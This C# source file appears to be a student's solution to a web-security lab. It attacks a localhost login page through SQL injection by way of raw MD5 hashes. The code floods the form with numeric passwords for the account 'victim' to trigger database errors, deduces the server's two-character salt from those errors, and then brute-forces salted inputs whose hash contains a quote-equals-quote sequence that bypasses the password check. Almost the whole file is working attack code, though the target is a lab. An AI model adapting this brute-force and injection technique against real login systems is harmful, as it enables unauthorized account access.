using System.Security.Cryptography;
using System.Text;
using System.Threading.Channels;

namespace Bungle
{
    public class SqlInjecting
    {
        // Will run through the website in order to attempt to find a plausible salt that the server uses.
        static async IAsyncEnumerable<int> FindErrors()
        {
            // Connect to the HTTP
            using HttpClient httpClient = new();
            string url = "http://localhost/project2/sqlinject2/checklogin.php";
            Channel<int> chan = Channel.CreateUnbounded<int>();

            // We now throw in a bunch of #'s in as the pswd into the website.
            _ = Task.Run(async () =>
            {
                try
                {
                    await Parallel.ForEachAsync(Enumerable.Range(int.MinValue, int.MaxValue),
                    new ParallelOptions { MaxDegreeOfParallelism = -1 },
                    async (i, ct) =>
                    {
                        Dictionary<string, string> formData = new()
                        {
                            {"username", "victim"},
                            {"password", $"{i}"},
                            {"uid", "U51801771"}
                        };
                        FormUrlEncodedContent content = new(formData);

                        HttpResponseMessage response = await httpClient.PostAsync(url, content, ct);
                        string htmlBody = await response.Content.ReadAsStringAsync(ct);

                        // If we end up getting a MySQL error, log this for the LogPossibleSalts() to perform further checks on.
                        if (htmlBody.Contains("Error"))
                        {
                            await chan.Writer.WriteAsync(i, ct);
                        }
                    });
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occured: {ex.Message}");
                }
                // Make sure to tell the channel that its done.
                finally
                {
                    chan.Writer.Complete();
                }
            });

            await foreach (int pswd in chan.Reader.ReadAllAsync())
            {
                yield return pswd;
            }
        }

        // Will run salt + various ints, checking if its hash contains '=', and then inputting that into the website to see if we login.
        public static async Task Crack()
        {
            Console.WriteLine("MD5 cracking BEGIN.\n");

            // Setting up vars and HTTP connection.
            string salt = "a0"; // Deduced from Running LogPossibleSalts w/ DisplayLoop(saltDict) uncommented.
            using CancellationTokenSource cts = new();

            // Wrapped around a try-catch block specifically incase all other threads gets a cancel order from cts.
            try
            {
                // Will go through each int to test out if its ASCII contains '=', as this will result in the SQL checking a double-negative.
                // password = '~~~'='~~~' --> FALSE='~~~' --> TRUE
                // Intuitviely, checking if FALSE = a rnd string will result in FALSE, but 2 FALSES will make 1 TRUE.
                await Parallel.ForEachAsync(Enumerable.Range(0, int.MaxValue),
                new ParallelOptions { MaxDegreeOfParallelism = -1, CancellationToken = cts.Token },
                async (i, ct) =>
                {
                    ct.ThrowIfCancellationRequested(); // Periodic cancellation check.

                    string saltPswd = salt + i;
                    byte[] utf8Bytes = Encoding.UTF8.GetBytes(saltPswd);
                    byte[] hashedBytes = MD5.HashData(Encoding.UTF8.GetBytes(saltPswd));
                    string asciiApprox = Encoding.UTF8.GetString(hashedBytes);
                    string pattern = "'='";

                    if (asciiApprox.Contains(pattern))
                    {
                        ct.ThrowIfCancellationRequested(); // Periodic cancellation check.

                        // Connect to the HTTP
                        using HttpClient httpClient = new();
                        string url = "http://localhost/project2/sqlinject2/checklogin.php";

                        Dictionary<string, string> formData = new()
                        {
                        { "username", "victim" },
                        { "password", $"{i}" },
                        { "uid", "U51801771" }
                        };
                        FormUrlEncodedContent content = new(formData);

                        // Send data and wait for responce.
                        HttpResponseMessage response = await httpClient.PostAsync(url, content, ct);
                        string htmlBody = await response.Content.ReadAsStringAsync(ct);

                        if (htmlBody.Contains("Incorrect"))
                        {
                            Console.WriteLine($"{i} failed login\n");
                        }
                        else if (htmlBody.Contains("Invalid") || htmlBody.Contains("Error"))
                        {
                            Console.WriteLine($"{i} got some other error\n");
                        }
                        // This should mean we successfully got through the login.
                        else
                        {
                            Console.WriteLine($"SUCCESS! {i} LOGGED IN:\n{htmlBody}\n");
                            cts.Cancel();
                        }
                    }
                });
            }
            // Cancels all other threads if cts orders so (when a valid login is found).
            catch (OperationCanceledException)
            {
                Console.WriteLine($"Pswd alr found!\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occured: {ex.Message}\n");
            }

            Console.WriteLine("END");
        }

        // Taking in pswds that error'ed out the website, check it against all possible salts and add them to a dictionary to lookup which
        // salt combinations are most likely producing the error. For reference, this is what I got after around 10 mins of the code running:
        //
        // [09/11/2025 17:40:05] Top 10 Items:
        // 1: a0, 6795
        // 2: ka, 514
        // 3: yF, 505
        // 4: 4T, 504
        // 5: F0, 503
        // 6: Xl, 502
        // 7: cm, 502
        // 8: Bk, 499
        // 9: op, 499
        // 10: A4, 498
        //
        // So the salt most definitely is a0
        public static async Task LogPossibleSalts()
        {
            // Setting up the values to store the salts and its occurence value.
            string saltChars = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            Dictionary<string, int> saltDict = [];
            List<string> allPossibleSalts = [];

            // I commented this out, but uncomment this to see how the salt dictionary works in console.
            DisplayLoop(saltDict);

            for (int i = 0; i < saltChars.Length; i++)
                for (int j = 0; j < saltChars.Length; j++)
                {
                    saltDict.Add($"{saltChars[i]}{saltChars[j]}", 0);
                    allPossibleSalts.Add($"{saltChars[i]}{saltChars[j]}");
                }


            await foreach (int pswd in FindErrors())
            {
                Parallel.ForEach(Enumerable.Range(0, allPossibleSalts.Count),
                new ParallelOptions { MaxDegreeOfParallelism = -1 },
                (i, ct) =>
                {
                    string saltedPswd = allPossibleSalts[i] + pswd;
                    byte[] utf8Bytes = Encoding.UTF8.GetBytes(saltedPswd);
                    byte[] hashedBytes = MD5.HashData(Encoding.UTF8.GetBytes(saltedPswd));
                    string asciiApprox = Encoding.UTF8.GetString(hashedBytes);

                    if (asciiApprox.Contains('\''))
                    {
                        saltDict[allPossibleSalts[i]]++;
                    }
                });
            }
        }

        // Debugging tool to see which salts are most likely causing an error on the website.
        static void DisplayLoop(Dictionary<string, int> dictToDisplay)
        {
            TimeSpan interval = TimeSpan.FromSeconds(5);
            object lockObj = new();

            Task.Run(WaitForInterval);

            // Waits every 5 second.
            async Task WaitForInterval()
            {
                while (true)
                {
                    await Task.Delay(interval);

                    DisplayTopItems();
                }
            }

            // Shows the top 10 items in the salt dictionary.
            void DisplayTopItems()
            {
                Dictionary<string, int> snapshot;

                lock (lockObj)
                {
                    snapshot = new(dictToDisplay);
                }

                Console.Clear();

                if (snapshot.Count != 0)
                {
                    var topItems = snapshot
                    .OrderByDescending(key => key.Value)
                    .Take(10)
                    .ToList();

                    Console.WriteLine($"[{DateTime.Now}] Top 10 Items:");
                    for (int i = 0; i < 10; i++)
                    {
                        var item = topItems[i];
                        Console.WriteLine($"{i + 1}: {item.Key}, {item.Value}");
                    }
                }
            }
        }
    }
}